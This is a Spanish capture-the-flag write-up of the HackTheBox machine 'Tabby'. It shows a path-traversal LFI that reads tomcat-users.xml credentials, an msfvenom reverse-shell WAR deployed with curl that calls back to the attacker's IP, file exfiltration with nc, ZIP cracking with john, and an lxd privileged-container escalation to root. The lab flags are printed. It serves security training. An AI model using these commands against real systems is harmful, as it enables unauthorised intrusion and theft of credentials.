---
layout: post
render_with_liquid: false
title: "HTB Writeup: Tabby"
date: 2026-05-21
category: writeups
tags: [htb, linux, easy, lfi, tomcat, war, manager-script, password-reuse, zip-cracking, lxd]
platform: HackTheBox
os: Linux
difficulty: Easy
has_exploits: false
exploits_url: /writeups/tabby/exploit/
resumen: "LFI en news.php para leer tomcat-users.xml y extraer credenciales del rol manager-script. Despliegue de un WAR malicioso vía la API REST /manager/text/ para foothold como tomcat. Movimiento lateral crackeando un ZIP de backup (password reuse para su ash). Escalada a root abusando del grupo lxd con un contenedor Alpine privilegiado."
permalink: /writeups/tabby/
---

| Propiedad  | Valor      |
| :--------- | :--------- |
| Plataforma | HackTheBox |
| OS         | Linux      |
| Dificultad | Easy       |
| Autor      | Ghostvyle  |

### Temas Tratados

- **Reconocimiento:** Nmap, Whatweb, Gobuster (dir y vhost)
- **Explotación:** LFI vía `news.php?file=...` → lectura de `tomcat-users.xml` → despliegue WAR malicioso por `/manager/text/deploy` (rol `manager-script`)
- **Movimiento lateral:** ZIP de backup en `/var/www/html/files/`, crack con `john` (`zip2john`), reutilización de contraseña → `su ash`
- **Escalada:** Grupo `lxd` → contenedor Alpine con `security.privileged=true` y `path=/`, fugando a root del host

## Sinopsis

Máquina Linux que combina un **LFI clásico** con un **despliegue Tomcat por API REST**, finalizando con **`lxd`** para escalar.

El sitio en `:80` (Mega Hosting) tiene `news.php?file=` sin saneamiento — leyendo `tomcat-users.xml` extraemos credenciales del usuario `tomcat` con el rol `manager-script`. Ese rol no nos da acceso al GUI `/manager/html` pero **sí** a `/manager/text/deploy`, la API REST. Subimos un WAR generado con `msfvenom` (JSP reverse shell) y obtenemos shell como `tomcat`.

En `/var/www/html/files/` aparece `16162020_backup.zip` cifrado. `zip2john` + rockyou rompe la contraseña (`admin@it`), que también vale como contraseña local de `ash`. Una vez como `ash`, el grupo `lxd` permite crear contenedores. Importamos una imagen Alpine, montamos el filesystem del host (`/`) dentro del contenedor con `security.privileged=true` y leemos `/mnt/root/root/root.txt`.

---

## Reconocimiento

### Escaneo de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.24.208 -oG allPorts
```

![Descubrimiento de puertos abiertos con nmap](/writeups/tabby/assets/01_nmap_all_ports.png)

| Puerto    | Servicio | Versión                          |
| :-------- | :------- | :------------------------------- |
| 22/tcp    | SSH      | OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) |
| 80/tcp    | HTTP     | Apache 2.4.41 (Ubuntu)           |
| 8080/tcp  | HTTP     | Apache Tomcat                    |

```bash
sudo nmap -sCV -p22,80,8080 10.129.24.208 -oN targeted
```

![Detección de servicio y versión con nmap -sCV](/writeups/tabby/assets/02_nmap_service_version.png)

### Whatweb y fingerprinting

```bash
whatweb http://10.129.24.208
whatweb http://10.129.24.208:8080
```

![Whatweb confirma Apache 2.4.41 + Tomcat](/writeups/tabby/assets/03_whatweb.png)

El sitio `:80` es **Mega Hosting** (HTML5 + Bootstrap + jQuery). En la página inicial hay un correo `sales@megahosting.htb`. El `:8080` sirve el splash por defecto de **Apache Tomcat**.

```bash
echo "10.129.24.208 megahosting.htb" | sudo tee -a /etc/hosts
```

### Fuzzing de directorios

```bash
gobuster dir -u http://10.129.24.208 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50
```

![Gobuster en :80](/writeups/tabby/assets/04_gobuster_80.png)

Recursos relevantes en `:80`:

| Ruta            | Código | Observación                            |
| :-------------- | :----- | :------------------------------------- |
| `/files`        | 301    | Directorio de "archivos" del hosting   |
| `/assets`       | 301    | Estáticos del sitio                    |
| `/server-status`| 403    | Mod_status protegido                   |

En `:8080`:

```bash
gobuster dir -u http://10.129.24.208:8080 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50
```

![Gobuster en :8080](/writeups/tabby/assets/05_gobuster_8080.png)

Los caminos típicos de Tomcat: `/docs`, `/examples` y `/manager`. **`/manager`** es el panel de administración que permite desplegar WARs — protegido por basic auth.

---

## Explotación

### LFI en news.php

Navegando el sitio aparece el enlace **News → Read More**, que dirige a:

```
http://megahosting.htb/news.php?file=statement
```

El recurso es legible (lectura del fichero `files/statement`). El parámetro `file` sin sanear es claramente susceptible a un *path traversal*:

```
http://megahosting.htb/news.php?file=../../../../../../etc/passwd
```

![Contenido de /etc/passwd vía LFI](/writeups/tabby/assets/06_lfi_passwd.png)


> **¿Por qué tantos `../`?**: a ciegas inyectamos más niveles de los necesarios. El sistema de ficheros ignora los `..` que sobran cuando ya estamos en `/`. Es preferible pasarse a quedarse corto, sobre todo cuando no sabemos exactamente desde qué `cwd` corre el servidor.

### Lectura de `tomcat-users.xml`

Exploramos Tomcat 9 en busca de credenciales. `/usr/share/tomcat9/etc/tomcat-users.xml`:

```
http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

![tomcat-users.xml leído por LFI](/writeups/tabby/assets/07_lfi_tomcat_users.png)

```xml
<user username="tomcat"
      password="$3cureP4s5w0rd123!"
      roles="admin-gui,manager-script"/>
```

| Rol             | Permite                                             |
| :-------------- | :-------------------------------------------------- |
| `admin-gui`     | Acceso al *Host Manager* (`/host-manager/html`)     |
| `manager-script`| API REST `/manager/text/*` — **sí permite deploy** |

Faltan los roles `manager-gui` y `manager-jmx`, así que `/manager/html` rechaza el login. Pero `manager-script` es **suficiente** para subir un `.war` mediante la API.

### Generando el WAR malicioso

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.178 LPORT=7777 -f war -o revshell.war
```

![msfvenom genera revshell.war](/writeups/tabby/assets/08_msfvenom_war.png)

> **WAR (Web Application Archive)**: un ZIP con la estructura de una aplicación Java EE. Al desplegarse en `webapps/`, Tomcat lo descomprime y registra los servlets/JSPs declarados. Un JSP dentro del WAR se ejecuta como código Java en la JVM con los privilegios del proceso Tomcat.

### Despliegue por la API y reverse shell

Levantamos listener:

```bash
nc -lvnp 7777
```

Subimos y desplegamos en `context path /app`:

```bash
curl -u 'tomcat:$3cureP4s5w0rd123!' \
     --upload-file revshell.war \
     "http://10.129.24.208:8080/manager/text/deploy?path=/app&update=true"
# OK - Deployed application at context path [/app]
```

![Despliegue exitoso del WAR vía API REST](/writeups/tabby/assets/09_war_deploy.png)

Visitamos el endpoint para disparar el JSP:

```
http://10.129.24.208:8080/app/
```

![Reverse shell recibida como tomcat](/writeups/tabby/assets/10_tomcat_shell.png)

```
Connection received on 10.129.24.208 41624
whoami
tomcat
```

---

## Movimiento lateral — tomcat → ash

### El ZIP de backup

```bash
ls /var/www/html/files
# 16162020_backup.zip  archive  revoked_certs  statement
```

Transferimos el ZIP a nuestra máquina (sin tener `curl`/`scp` instalados a veces — usamos `nc`):

```bash
# (atacante)
nc -lvnp 4444 > 16162020_backup.zip

# (víctima)
nc 10.10.15.178 4444 < 16162020_backup.zip
```

![ZIP transferido a la máquina atacante](/writeups/tabby/assets/11_backup_zip_transfer.png)

El listado interno con `7z l` muestra ficheros del sitio web cifrados.

### Crackeo con John

```bash
zip2john 16162020_backup.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![John recupera la contraseña admin@it](/writeups/tabby/assets/12_john_zip_crack.png)

```
admin@it       (16162020_backup.zip)
```

> **Password reuse**: las contraseñas robadas en un contexto rara vez se quedan en ese contexto. Aquí el password del ZIP es **el mismo** que el de la cuenta del sistema de `ash`.

### `su ash` y flag de usuario

```bash
su ash
# Password: admin@it
cat /home/ash/user.txt
# 0ded3e8cb1795329729a3f17e4eac87e
```

![su ash → flag de usuario](/writeups/tabby/assets/13_su_ash_user_flag.png)

---

## Escalada de privilegios — ash → root vía LXD

### Reconocimiento

```bash
id
# uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

El grupo **`lxd`** es la pista: cualquier miembro puede gestionar contenedores LXD, y un contenedor con `security.privileged=true` montando `/` del host dentro de `/mnt/root` da control absoluto del filesystem real con UID 0 *dentro del contenedor* (que sin namespacing efectivo == root del host).

```bash
searchsploit lxd
# Ubuntu 18.04 - 'lxd' Privilege Escalation       | linux/local/46978.sh
searchsploit -m 46978
```

![searchsploit muestra 46978.sh](/writeups/tabby/assets/14_searchsploit_lxd.png)

![Código del exploit 46978.sh](/writeups/tabby/assets/15_lxd_exploit_code.png)

### Construcción de la imagen Alpine

El exploit necesita una imagen LXD mínima. Usamos `lxd-alpine-builder`:

```bash
# (atacante)
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo bash build-alpine
# Produce: alpine-v3.23-x86_64-20260408_1857.tar.gz
```

Transferimos la imagen y el script `46978.sh` a la víctima (HTTP o nc).

### Ejecución del exploit

Como `ash`, `lxc` no está en el PATH por defecto (vive en `/snap/bin`):

```bash
export PATH=$PATH:/snap/bin
chmod +x 46978.sh
./46978.sh -f alpine-v3.23-x86_64-20260408_1857.tar.gz
```

![Exploit LXD importando imagen Alpine y lanzando contenedor privilegiado](/writeups/tabby/assets/16_lxd_exec.png)

Lo que hace el script paso a paso:

1. `lxc image import` — carga la imagen Alpine en LXD
2. `lxc init` con la imagen → crea el contenedor `privesc`
3. `lxc config set ... security.privileged=true` — quita el namespacing de usuario
4. `lxc config device add ... disk source=/ path=/mnt/root recursive=true` — monta `/` del host dentro del contenedor
5. `lxc start` y `lxc exec ... sh` — entra como root del contenedor (= root del host vía bind mount)

Dentro del contenedor estamos como `root`. El filesystem del host vive en `/mnt/root`:

```bash
~ # whoami
root
~ # cat /mnt/root/root/root.txt
4df13cf996d13c0c0667313fb5154723
```

![Flag de root leída desde el bind mount](/writeups/tabby/assets/17_root_flag.png)

Somos **root** en Tabby.

---

> **Disclaimer**: Este contenido es exclusivamente para investigación y formación en ciberseguridad. Solo debe aplicarse en entornos autorizados y controlados.
